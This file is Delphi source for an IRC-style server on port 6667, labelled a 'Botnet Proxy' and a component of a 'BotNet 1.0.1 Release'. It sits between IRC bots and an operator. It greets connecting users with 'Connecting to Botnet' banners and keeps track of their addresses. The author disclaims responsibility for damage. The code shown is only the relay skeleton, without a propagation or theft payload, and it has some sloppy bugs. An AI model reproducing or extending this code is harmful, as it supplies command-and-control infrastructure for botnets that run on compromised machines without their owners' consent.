   {

     Botnet Proxy made by p0ke
     A component of the BotNet 1.0.1 Release

     Use this at your own risk, The author(s) of this app
     cannot be held responsible for any actions nor damage
     caused / made by this app. Its your own responsibility


     IrcBots -> Proxy <- User
     IrcBots --^ ^
     IrcBots ----|


     serversocket...
     activeconnects: Integer;
     connections: array[0..60000] of Integer;
     fdsocket: array[0..60000] of TSocket;

   }

   program bProxy;

   uses
     Windows, Messages,
     Winsock;
   //  uServer in 'uServer.pas';

   type
     TSocketData = Record
       Socket: TSocket;
     End;
     PSocketData = ^TSocketData;

   const
     SM_CONNECT = WM_USER+156;
     SM_SOCKET = WM_USER+157;
     ServerClass = '0x0F0';

   var
     WSAData: TWSAData;

     SocketData: TSocketData;

     fdSocket: Array[0..60000] Of TSocket;
     connections: Array[0..60000] Of Integer;
     Params  : Array[0..500] Of String;
     Users   : Array[0..60000] Of String;

     ActiveConnections: Integer;

     CServ1                 : TSocket;

     Inst                   : Hwnd;
     wClass                 : TWndClass;
     MainWin                : HWND;
     wsData                 : TWSADATA;
     Serv1                  : TSocket;
     SockAddrIn             : SockAddr_in;
     RemoteSockAddr         : pSockAddr;
     RemoteSockAddrLen      : pInteger;

   Procedure GetParams(S: String);
   Var
     Tmp         :String;
     I           :Integer;
   Begin
     S := S + ' ';
     I := 0;
     FillChar(Params, 500, #0);

     While Pos(' ', S) > 0 Do
     Begin
       If I = 500 Then Break;
       Tmp := Copy(S, 1, Pos(' ', S)-1);
       S   := Copy(S, Pos(' ', S)+1, Length(S));
       If Tmp <> '' Then
       Begin

         if tmp[1] = '"' Then Delete(tmp, 1, 1);
         if tmp[1] = #10 then delete(tmp, 1, 1);
         if tmp[1] = #13 then delete(tmp, 1, 1);

         if tmp[length(tmp)] = '"' then delete(tmp, length(tmp), 1);
         if tmp[length(tmp)] = #10 then delete(tmp, length(tmp), 1);
         if tmp[length(tmp)] = #13 then delete(tmp, length(tmp), 1);

         Params[i] := Copy(Tmp, 1, 25);
         Inc(I);
       End;
     End;

     I := 2;

   End;

   function GetRemoteAddress(FSocket: TSocket): string;
   var
     SockAddrIn: TSockAddrIn;
     Size: Integer;
   begin
     Size := sizeof(SockAddrIn);
     getpeername(FSocket, SockAddrIn, Size);
     Result := inet_ntoa(SockAddrIn.sin_addr);
   end;

   Function SendData(Text:String; Sock: TSocket):Integer;
   Begin
     Result := Send(Sock, Text[1], Length(Text), 0);
   End;

   Function ReadSock(P :Pointer):Dword; StdCall;
   Var
     Socket: TSocket;
     recvBuf:Array[0..36000] Of Char;
     DAta  : String;
     Re    : Bool;
     Tmp   : String;
     I     : Integer;
   Begin
     Socket := PSocketData(P)^.Socket;

     While Recv(Socket, recvBuf, SizeOf(recvBuf), 0) > 0 Do
     Begin
       Re := False;
       Data := recvBuf;
       ZeroMemory(@recvBuf, SizeOf(recvBuf));

       If Copy(Data, Pos(#10, Data)+1, 1) <> ''  Then
         Re := True Else Re := False;

       Repeat
         Tmp := Copy(Data, 1, Pos(#10, Data)-1);
         If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);
         Data := Copy(Data, Pos(#10, Data)+1, Length(Data));
         If Data = '' Then Re := False Else Re := True;

         GetParams(Tmp);
         If Params[0] = 'USER' Then
         Begin
           For I := 0 To ActiveConnections -1 Do
           Begin
             If Connections[I] = Socket Then
             Begin
               Users[I] := Params[4]+#1+GetRemoteAddress(Socket);
               Break;
             End;
           End;
           SendData(':SiC NOTICE AUTH :*** Connecting to Botnet'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** Login Successfull'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** Welcome to a new way of botnets'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** --------------------------'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** WARNING: The author(s) cannot be'#10,Socket);
           SendData(':SiC NOTICE AUTH :*** held responsible for any actions'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** taken by users of this tool.'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** Use this at own risk and responsibility'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** '+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** You have been warned (made by p0ke)'+#10,Socket);
           SendData(':SiC NOTICE AUTH :*** --------------------------'+#10,Socket);
         End;

       Until Re = False;
     End;

     For I := 0 To ActiveConnections -1 Do
     Begin
       If Connections[I] = Socket Then
         Users[I] := '';
         Connections[i] := 0;
         fdSocket[i] := 0;
     End;
     CloseSocket(Socket);
   End;

   // --- server

   procedure Server1(Port: integer);
   var
     Size: integer;
     SockAddr: TSockAddr;
     SockAddrIn: TSockAddrIn;
     threadid: Dword;
     i, j: Integer;
   begin
     Serv1 := socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
     SockAddrIn.sin_family := AF_INET;
     SockAddrIn.sin_addr.s_addr := INADDR_ANY;
     SockAddrIn.sin_port := htons(Port);
     bind(Serv1, SockAddrIn, sizeof(SockAddrIn));

     Winsock.listen(Serv1, 5);
     Repeat
       Size := sizeof(TSockAddr);
       for i := 0 to activeconnections -1 do
       begin
         if fdsocket[i] = 0 then
         begin
           j := i;
           break;
         end;
       end;
       fdsocket[j] := Winsock.accept(Serv1, @SockAddr, @Size);
       Connections[j] := fdsocket[j];
       SocketData.Socket := fdsocket[j];
       CreateThread(nil, 0, @ReadSock, @socketdata, 0, threadid);

       Inc(activeconnections);
     Until ActiveConnections = 60000;
   end;

   // --- server

   begin

     WsaStartUp(MakeWord(2,1),wsaData);

     Server1(6667);

     WSACleanUp();

   end.
